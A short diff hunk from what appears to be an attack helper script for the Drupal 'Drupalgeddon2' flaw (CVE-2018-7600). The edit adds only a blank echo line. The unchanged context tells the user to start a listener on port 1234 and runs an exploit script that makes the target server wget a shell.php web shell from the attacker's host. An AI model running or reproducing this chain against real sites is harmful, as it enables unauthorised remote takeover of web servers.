@@ -15,6 +15,7 @@ nano shell.php
 
 echo "GOOD JOB!!! :)"
 echo "Start a listener in another shell on port 1234"
+echo ""
 read -p "press enter one done" answer
 
 python drupa7-CVE-2018-7600.py -c "wget http://$LHOST/shell.php" http://$RHOST
